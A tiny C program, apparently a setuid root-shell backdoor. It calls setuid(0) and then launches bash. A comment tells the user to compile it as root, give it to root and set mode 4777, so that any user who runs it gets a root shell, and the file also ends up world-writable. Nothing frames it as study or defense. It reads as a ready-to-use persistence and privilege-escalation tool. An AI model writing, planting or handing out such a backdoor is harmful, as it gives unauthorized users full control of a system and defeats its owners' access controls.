#include <stddef.h>
#define _GNU_SOURCE


int main(){

	char *arguments[2];
	arguments[0] = "bash";
	arguments[1] = NULL; //koniec listy argumentów
	setuid(0);

	execvp("/bin/bash", arguments);
	
	//after compilation as root set: chown root:root chmod 4777
	
}
